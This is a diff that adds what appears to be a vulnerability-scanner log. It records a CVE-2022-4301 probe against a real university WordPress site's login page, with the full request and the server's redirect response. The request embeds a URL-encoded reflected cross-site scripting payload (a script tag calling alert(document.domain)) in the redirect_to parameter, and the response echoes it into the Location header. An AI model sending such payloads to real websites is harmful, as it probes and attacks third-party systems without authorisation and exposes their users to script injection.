@@ -1,0 +1,25 @@
+[CVE-2022-4301] Dumped HTTP request for https://particletheory.science.unimelb.edu.au/wp-login.php?action=register&redirect_to=x%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+
+
+GET /wp-login.php?action=register&redirect_to=x%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
+Host: particletheory.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2022-4301] Dumped HTTP response https://particletheory.science.unimelb.edu.au/wp-login.php?action=register&redirect_to=x%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:09 GMT
+Location: https://blogs.unimelb.edu.au/particletheory/wp-login.php?action=register&redirect_to=x%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/
+Server: openresty
+Set-Cookie: eb_Kuno0Hujut7Da=Zim9Deten6Zoh2
+Vary: Cookie
+
+Redirecting...
